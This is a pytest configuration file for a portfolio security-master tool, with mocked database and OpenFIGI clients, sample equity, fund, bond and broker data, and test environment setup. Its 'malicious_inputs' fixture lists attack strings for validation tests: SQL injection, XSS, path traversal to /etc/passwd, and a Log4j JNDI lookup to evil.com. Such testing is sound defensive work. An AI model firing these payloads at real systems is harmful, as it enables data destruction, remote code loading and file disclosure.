"""
Pytest configuration for PP Security Master testing.
Provides comprehensive fixtures and test setup for all test types.
"""

import json
import os
import tempfile
from collections.abc import Generator
from datetime import date
from decimal import Decimal
from pathlib import Path
from typing import Any
from unittest.mock import MagicMock, patch

import pytest


def pytest_runtest_setup(item) -> None:
    """Set coverage context based on test path and markers.

    Args:
        item: Pytest test item whose file path determines the coverage context label.
    """
    test_path = str(item.fspath)

    # Determine context from test path
    if "/tests/unit/" in test_path:
        context = "unit"
    elif "/tests/integration/" in test_path:
        context = "integration"
    elif "/tests/database/" in test_path:
        context = "database"
    elif "/tests/classifier/" in test_path:
        context = "classifier"
    elif "/tests/extractor/" in test_path:
        context = "extractor"
    elif "/tests/storage/" in test_path:
        context = "storage"
    elif "/tests/patch/" in test_path:
        context = "patch"
    elif "/tests/security/" in test_path:
        context = "security"
    elif "/tests/performance/" in test_path:
        context = "performance"
    else:
        context = "other"

    # Set environment variable for coverage context
    os.environ["COVERAGE_CONTEXT"] = context


# =============================================================================
# DATABASE FIXTURES
# =============================================================================


@pytest.fixture(scope="session")
def test_db_url() -> str:
    """Provide test database URL.

    Returns:
        PostgreSQL connection string pointing to the local test database.
    """
    return "postgresql://test_user:test_pass@localhost:5432/test_pp_security_master"


@pytest.fixture
def mock_database_connection():
    """Mock database connection for unit tests.

    Returns:
        Mocked database connection context for isolation.
    """
    mock_conn = MagicMock()
    mock_cursor = MagicMock()
    mock_conn.cursor.return_value.__enter__.return_value = mock_cursor
    return mock_conn


@pytest.fixture
def mock_sqlalchemy_engine():
    """Mock SQLAlchemy engine for unit tests.

    Yields:
        Mocked SQLAlchemy create_engine callable for isolation.
    """
    with patch("sqlalchemy.create_engine") as mock_engine:
        yield mock_engine


# =============================================================================
# API CLIENT FIXTURES
# =============================================================================


@pytest.fixture
def mock_openfigi_client():
    """Mock OpenFIGI API client for testing.

    Returns:
        Mocked OpenFIGI API client for isolation.
    """
    mock_client = MagicMock()
    mock_client.classify_security.return_value = {
        "data": [
            {
                "figi": "BBG000B9XRY4",
                "securityType": "Common Stock",
                "compositeFIGI": "BBG000B9XRY4",
                "securityDescription": "APPLE INC",
                "ticker": "AAPL",
                "exchCode": "US",
                "shareClassFIGI": "BBG001S5N8V8",
            },
        ],
    }
    return mock_client


@pytest.fixture
def mock_http_client():
    """Mock HTTP client for external API testing.

    Yields:
        Mocked httpx.AsyncClient class for isolating external API calls.
    """
    with patch("httpx.AsyncClient") as mock_client:
        yield mock_client


# =============================================================================
# SAMPLE DATA FIXTURES
# =============================================================================


@pytest.fixture
def sample_security_data() -> dict[str, Any]:
    """Provide sample security data for testing.

    Returns:
        Dict representing an Apple Inc. equity with ISIN, symbol, sector, and currency fields.
    """
    return {
        "isin": "US0378331005",
        "symbol": "AAPL",
        "name": "Apple Inc.",
        "security_type": "equity",
        "currency": "USD",
        "exchange": "NASDAQ",
        "country": "US",
        "sector": "Technology",
        "industry": "Consumer Electronics",
    }


@pytest.fixture
def sample_fund_data() -> dict[str, Any]:
    """Provide sample fund/ETF data for testing.

    Returns:
        Dict representing the SPY ETF with ISIN, fund type, expense ratio, and benchmark fields.
    """
    return {
        "isin": "US46090E1038",
        "symbol": "SPY",
        "name": "SPDR S&P 500 ETF Trust",
        "security_type": "fund",
        "currency": "USD",
        "exchange": "NYSE",
        "fund_type": "ETF",
        "expense_ratio": Decimal("0.0945"),
        "benchmark": "S&P 500 Index",
    }


@pytest.fixture
def sample_bond_data() -> dict[str, Any]:
    """Provide sample bond data for testing.

    Returns:
        Dict representing a US Treasury bond with maturity date, coupon rate, and credit rating fields.
    """
    return {
        "isin": "US912828R770",
        "symbol": "T 2.25 02/15/2052",
        "name": "United States Treasury Bond 2.25% 02/15/2052",
        "security_type": "bond",
        "currency": "USD",
        "maturity_date": date(2052, 2, 15),
        "coupon_rate": Decimal("2.25"),
        "credit_rating": "AAA",
    }


@pytest.fixture
def sample_broker_transaction() -> dict[str, Any]:
    """Provide sample broker transaction for testing.

    Returns:
        Dict representing a Wells Fargo BUY transaction for AAPL with quantity, price, and fees.
    """
    return {
        "transaction_id": "TXN-001",
        "date": date(2024, 1, 15),
        "symbol": "AAPL",
        "isin": "US0378331005",
        "type": "BUY",
        "quantity": Decimal(100),
        "price": Decimal("185.50"),
        "fees": Decimal("9.95"),
        "currency": "USD",
        "account": "Investment-001",
        "broker": "Wells Fargo",
    }


# =============================================================================
# VALIDATION FIXTURES
# =============================================================================


@pytest.fixture(
    params=[
        "",  # Empty string
        "INVALIDX123",  # Invalid ISIN - wrong format
        "US0378331005" * 10,  # Too long
        None,  # None value
        123,  # Wrong type
        "US037833100",  # Too short ISIN
        "XX0378331005",  # Invalid country code
    ],
)
def invalid_isin_inputs(request):
    """Provide invalid ISIN inputs for edge case testing.

    Args:
        request: Pytest request object providing the current parameter from the params list.

    Returns:
        One invalid ISIN value per parametrize iteration, covering format, length, type, and country code errors.
    """
    return request.param


@pytest.fixture
def invalid_symbol_inputs() -> list[Any]:
    """Provide invalid symbol inputs for testing.

    Returns:
        List of values that should fail symbol validation, including empty strings, None, wrong types, and special characters.
    """
    return [
        "",  # Empty string
        None,  # None value
        123,  # Wrong type
        "A" * 20,  # Too long
        "!@#$%",  # Invalid characters
        " AAPL ",  # Leading/trailing spaces
    ]


@pytest.fixture
def security_classification_edge_cases() -> list[dict[str, Any]]:
    """Provide edge cases for security classification testing.

    Returns:
        List of dicts, each with an input and the expected error type it should raise during classification.
    """
    return [
        {"input": None, "expected_error": "ValidationError"},
        {"input": "", "expected_error": "ValidationError"},
        {"input": {"no_isin": "value"}, "expected_error": "ValidationError"},
        {"input": {"isin": "INVALID"}, "expected_error": "ClassificationError"},
        {
            "input": {"isin": "US0378331005", "symbol": ""},
            "expected_error": "ValidationError",
        },
    ]


# =============================================================================
# FILE FIXTURES
# =============================================================================


@pytest.fixture
def temp_directory() -> Generator[Path, None, None]:
    """Provide temporary directory for file testing.

    Yields:
        Path to a freshly created temporary directory that is removed after the test.
    """
    with tempfile.TemporaryDirectory() as temp_dir:
        yield Path(temp_dir)


@pytest.fixture
def sample_pp_xml_file(temp_directory: Path) -> Path:
    """Create sample Portfolio Performance XML file for testing.

    Args:
        temp_directory: Pytest fixture providing a fresh temporary directory for the file.

    Returns:
        Path to the written XML file containing a minimal Portfolio Performance portfolio.
    """
    xml_content = """<?xml version="1.0" encoding="UTF-8"?>
<client version="0.65.0">
    <securities>
        <security uuid="12345-67890">
            <name>Apple Inc.</name>
            <isin>US0378331005</isin>
            <tickerSymbol>AAPL</tickerSymbol>
            <currency>USD</currency>
            <prices>
                <price t="2024-01-15" v="18550"/>
            </prices>
        </security>
    </securities>
    <accounts>
        <account uuid="account-001">
            <name>Investment Account</name>
            <transactions>
                <portfolio-transaction type="BUY">
                    <date>2024-01-15</date>
                    <security-uuid>12345-67890</security-uuid>
                    <shares>100000000</shares>
                    <grossValue>1855000</grossValue>
                    <fees>995</fees>
                    <taxes>0</taxes>
                </portfolio-transaction>
            </transactions>
        </account>
    </accounts>
</client>"""

    file_path = temp_directory / "sample_portfolio.xml"
    file_path.write_text(xml_content, encoding="utf-8")
    return file_path


@pytest.fixture
def sample_wells_csv_file(temp_directory: Path) -> Path:
    """Create sample Wells Fargo CSV file for testing.

    Args:
        temp_directory: Pytest fixture providing a fresh temporary directory for the file.

    Returns:
        Path to the written CSV file containing sample Wells Fargo transaction rows.
    """
    csv_content = """Date,Description,Amount,Symbol,Quantity,Price
2024-01-15,BUY AAPL,"-1,855.00",AAPL,100,185.50
2024-01-20,DIVIDEND AAPL,23.00,AAPL,,
2024-02-01,SELL MSFT,"2,950.00",MSFT,25,118.00"""

    file_path = temp_directory / "sample_wells.csv"
    file_path.write_text(csv_content, encoding="utf-8")
    return file_path


@pytest.fixture
def sample_ibkr_xml_file(temp_directory: Path) -> Path:
    """Create sample IBKR Flex Query XML file for testing.

    Args:
        temp_directory: Pytest fixture providing a fresh temporary directory for the file.

    Returns:
        Path to the written XML file containing a minimal IBKR Flex Query trade record.
    """
    xml_content = """<?xml version="1.0" encoding="UTF-8"?>
<FlexQueryResponse queryName="Test" type="AF">
    <FlexStatements>
        <FlexStatement>
            <Trades>
                <Trade symbol="AAPL" dateTime="2024-01-15"
                       quantity="100" price="185.50"
                       proceeds="-18550" commission="-1.0"
                       currency="USD" isin="US0378331005"/>
            </Trades>
        </FlexStatement>
    </FlexStatements>
</FlexQueryResponse>"""

    file_path = temp_directory / "sample_ibkr.xml"
    file_path.write_text(xml_content, encoding="utf-8")
    return file_path


@pytest.fixture(scope="session")
def sample_data_dir() -> Path:
    """Provide the path to the committed ``sample_data`` directory.

    Resolved relative to this conftest so the location is independent of the
    working directory pytest is invoked from.

    Returns:
        Path to the repository-root ``sample_data`` directory of realistic
        broker sample files.
    """
    return Path(__file__).parent.parent / "sample_data"


@pytest.fixture
def ibkr_flex_trades_sample_file(sample_data_dir: Path) -> Path:
    """Provide the realistic, sanitized IBKR Flex Query trade sample.

    Unlike ``sample_ibkr_xml_file`` (a single hand-built trade), this fixture
    points at a 67-trade export using the genuine IBKR Flex attribute layout
    (``tradePrice``, ``ibCommission``, ``assetCategory``/``subCategory``,
    ``securityIDType``, the ``MM/DD/YYYY;HHMMSS`` ``dateTime`` format, etc.).
    The account number and broker execution/order IDs are synthetic; security
    identifiers and trade economics are real public values.

    Args:
        sample_data_dir: Fixture providing the ``sample_data`` directory path.

    Returns:
        Path to the sanitized IBKR Flex Query sample XML file.
    """
    return sample_data_dir / "IBKR_Flex_Trades_sample.xml"


@pytest.fixture
def ibkr_isin2secid_sample(sample_data_dir: Path) -> dict[str, str]:
    """Provide the ISIN to Morningstar secid map for the IBKR Flex sample.

    Covers the securities resolvable from the sample's trades; the four mutual
    funds in the sample are intentionally absent, mirroring the real case where
    a freshly extracted security has no cached classification yet.

    Args:
        sample_data_dir: Fixture providing the ``sample_data`` directory path.

    Returns:
        Mapping of ISIN to ``secid|type|domain`` strings.
    """
    path = sample_data_dir / "isin2secid_sample.json"
    return json.loads(path.read_text(encoding="utf-8"))


# =============================================================================
# PERFORMANCE FIXTURES
# =============================================================================


@pytest.fixture
def benchmark_data() -> dict[str, Any]:
    """Provide benchmark data for performance testing.

    Returns:
        Dict containing a 1000-item ISIN list, a classification volume breakdown, and a max processing time threshold.
    """
    return {
        "large_security_list": [f"US{i:010d}" for i in range(1000)],
        "complex_classification_data": {"equities": 500, "funds": 300, "bonds": 200},
        "max_processing_time": 5.0,  # seconds
    }


# =============================================================================
# CONFIGURATION FIXTURES
# =============================================================================


@pytest.fixture
def test_config() -> dict[str, Any]:
    """Provide test configuration settings.

    Returns:
        Dict with database, openfigi, logging, and security_master configuration blocks populated with test values.
    """
    return {
        "database": {
            "url": "postgresql://test_user:test_pass@localhost:5432/test_db",
            "pool_size": 5,
            "max_overflow": 10,
        },
        "openfigi": {
            "api_key": "test_api_key",
            "base_url": "https://api.openfigi.com/v3",
            "rate_limit": 10,
        },
        "logging": {
            "level": "DEBUG",
            "format": "%(asctime)s - %(name)s - %(levelname)s - %(message)s",
        },
        "security_master": {"batch_size": 100, "max_retries": 3, "timeout": 30},
    }


@pytest.fixture(autouse=True)
def setup_test_environment():
    """Automatically set up test environment variables.

    Yields:
        Control to the test after injecting test env vars, then restores original values on teardown.
    """
    test_env = {
        "TESTING": "true",
        "LOG_LEVEL": "DEBUG",
        # Test-only credentials matching the CI postgres service; not a secret.
        "DATABASE_URL": "postgresql://test_user:test_password@localhost:5432/test_db",  # pragma: allowlist secret
        "OPENFIGI_API_KEY": "test_api_key",
        "OPENFIGI_BASE_URL": "https://api.openfigi.com/v3",
    }

    # Store original values
    original_env = {}
    for key, value in test_env.items():
        original_env[key] = os.environ.get(key)
        os.environ[key] = value

    yield

    # Restore original values
    for key, value in original_env.items():
        if value is None:
            os.environ.pop(key, None)
        else:
            os.environ[key] = value


# =============================================================================
# MOCK FIXTURES
# =============================================================================


@pytest.fixture
def mock_logger():
    """Mock logger for testing.

    Returns:
        MagicMock instance replacing a standard Python logger for assertion in tests.
    """
    return MagicMock()


@pytest.fixture
def mock_file_system():
    """Mock file system operations.

    Yields:
        Dict of mocked Path methods (exists, read_text, write_text) for controlling file system behaviour in tests.
    """
    with (
        patch("pathlib.Path.exists") as mock_exists,
        patch("pathlib.Path.read_text") as mock_read,
        patch("pathlib.Path.write_text") as mock_write,
    ):
        mock_exists.return_value = True
        yield {"exists": mock_exists, "read_text": mock_read, "write_text": mock_write}


# =============================================================================
# SECURITY TESTING FIXTURES
# =============================================================================


@pytest.fixture
def malicious_inputs() -> list[str]:
    """Provide malicious inputs for security testing.

    Returns:
        List of attack strings covering SQL injection, XSS, path traversal, null bytes, and injection patterns.
    """
    return [
        "'; DROP TABLE securities; --",  # SQL injection
        "<script>alert('xss')</script>",  # XSS
        "../../etc/passwd",  # Path traversal
        "\x00\x01\x02\x03",  # Null bytes
        "A" * 10000,  # Buffer overflow attempt
        "${jndi:ldap://evil.com/a}",  # Log4j injection
        "{{7*7}}",  # Template injection
        "javascript:alert(1)",  # JavaScript injection
    ]


@pytest.fixture
def valid_but_edge_case_inputs() -> list[dict[str, Any]]:
    """Provide valid but edge case inputs for robustness testing.

    Returns:
        List of dicts exercising boundary values such as minimum price, maximum name length, and extreme dates.
    """
    return [
        {"isin": "US" + "0" * 9, "name": ""},  # Valid ISIN, empty name
        {"isin": "GB0002634946", "name": "A" * 255},  # Maximum name length
        {"symbol": "BRK.A", "price": Decimal("0.01")},  # Minimum price
        {"symbol": "BRK.A", "price": Decimal("999999.99")},  # Maximum price
        {"date": date(1900, 1, 1)},  # Very old date
        {"date": date(2100, 12, 31)},  # Future date
    ]
